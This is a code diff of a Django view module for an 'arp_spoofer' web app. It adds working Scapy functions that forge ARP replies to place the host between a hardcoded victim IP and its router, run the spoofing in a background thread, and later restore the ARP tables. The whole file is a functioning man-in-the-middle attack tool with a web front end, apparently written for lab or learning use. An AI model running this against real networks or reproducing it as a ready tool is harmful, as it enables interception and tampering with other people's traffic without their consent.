@@ -1,70 +1,82 @@
-from django.shortcuts import render
-from django.http import JsonResponse
+from django.http import JsonResponse, HttpResponseRedirect
+from django.shortcuts import render, redirect
 from django.contrib import messages
-from .utils import (
-    get_gateway_info, scan_network, start_spoofing_continuous, stop_spoofing, get_packet_count
-)
+import threading
+import time
+import scapy.all as scapy
 
+# Global Variables
+is_spoofing = False
+packet_count = 0
+
+# Utility Functions
+def restore(destination_ip, source_ip):
+    destination_mac = get_mac(destination_ip)
+    source_mac = get_mac(source_ip)
+    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
+    scapy.send(packet, verbose=False, count=4)
+
+def spoof(target_ip, spoof_ip):
+    target_mac = get_mac(target_ip)
+    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
+    scapy.send(packet, verbose=False)
+
+def get_mac(ip):
+    arp_request = scapy.ARP(pdst=ip)
+    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
+    arp_request_broadcast = broadcast / arp_request
+    answered_list = scapy.srp(arp_request_broadcast, timeout=2, verbose=False)[0]
+    return answered_list[0][1].hwsrc
+
+# Spoofing Thread
+def spoofing_thread(victim_ip, router_ip):
+    global is_spoofing, packet_count
+    try:
+        while is_spoofing:
+            spoof(victim_ip, router_ip)
+            spoof(router_ip, victim_ip)
+            packet_count += 2
+            print(f"\r[+] Packets sent: {packet_count}", end="", flush=True)
+            time.sleep(2)
+    except Exception as e:
+        print(f"[ERROR] {str(e)}")
+    finally:
+        is_spoofing = False
+
+# Views
 def index(request):
-    # Initialize spoofing status in the session if not already set
-    if "spoofing_status" not in request.session:
-        request.session["spoofing_status"] = False
+    global is_spoofing
+    return render(request, "arp_spoofer/index.html", {"is_spoofing": is_spoofing})
 
-    gateway_info = None
-    scan_results = None
-    error = None
-    spoofing_status = request.session.get("spoofing_status", False)
 
+def start_spoofing(request):
+    global is_spoofing, packet_count
     if request.method == "POST":
-        if "detect_gateway" in request.POST:
-            # Detect Gateway Action
-            gateway_info = get_gateway_info()
-            if gateway_info.get("error"):
-                messages.error(request, gateway_info["error"])
-            else:
-                messages.success(request, f"Gateway detected: {gateway_info['ip']} ({gateway_info['mac']})")
+        victim_ip = "172.16.149.163"
+        router_ip = "172.16.149.2"
+        if is_spoofing:
+            messages.error(request, "Spoofing is already running.")
+            return redirect("arp_spoofer:index")
+        is_spoofing = True
+        packet_count = 0  # Reset packet count when spoofing starts
+        thread = threading.Thread(target=spoofing_thread, args=(victim_ip, router_ip))
+        thread.daemon = True
+        thread.start()
+        messages.success(request, "Spoofing started successfully.")
+        return redirect("arp_spoofer:index")
 
-        elif "scan_network" in request.POST:
-            # Scan Network Action
-            gateway_info = get_gateway_info()
-            if gateway_info and not gateway_info.get("error"):
-                ip_range = gateway_info["ip"] + "/24"
-                try:
-                    scan_results = scan_network(ip_range)
-                    request.session["scan_results"] = scan_results
-                    messages.success(request, f"Network scan completed successfully for {ip_range}.")
-                except Exception as e:
-                    messages.error(request, f"Error during network scan: {e}")
-            else:
-                messages.error(request, "Error detecting gateway.")
-
-        elif "start_spoofing" in request.POST:
-            # Start Spoofing Action
-            target_data = request.POST.get("target")
-            gateway_info = get_gateway_info()
-            if gateway_info and target_data:
-                victim_ip, victim_mac = target_data.split("|")
-                gateway_ip = gateway_info["ip"]
-                gateway_mac = gateway_info["mac"]
-                try:
-                    start_spoofing_continuous(victim_ip, victim_mac, gateway_ip, gateway_mac)
-                    request.session["spoofing_status"] = True
-                    messages.success(request, "Spoofing started.")
-                except Exception as e:
-                    messages.error(request, f"Error starting spoofing: {e}")
-
-        elif "stop_spoofing" in request.POST:
-            # Stop Spoofing Action
-            stop_spoofing()
-            request.session["spoofing_status"] = False
-            messages.success(request, "Spoofing stopped.")
-
-    return render(request, "arp_spoofer/index.html", {
-        "gateway_info": gateway_info,
-        "scan_results": request.session.get("scan_results"),
-        "spoofing_status": request.session.get("spoofing_status", False),
-    })
-
-
-def get_packet_count_view(request):
-    return JsonResponse({"packet_count": get_packet_count()})
+def stop_spoofing(request):
+    global is_spoofing
+    if request.method == "POST":
+        if not is_spoofing:
+            messages.error(request, "Spoofing is not running.")
+            return redirect("arp_spoofer:index")
+        is_spoofing = False
+        time.sleep(3)  # Allow spoofing thread to exit
+        victim_ip = "172.16.149.163"
+        router_ip = "172.16.149.2"
+        restore(victim_ip, router_ip)
+        restore(router_ip, victim_ip)
+        print("[+] Spoofing stopped and ARP tables restored.")
+        messages.success(request, "Spoofing stopped successfully.")
+        return redirect("arp_spoofer:index")
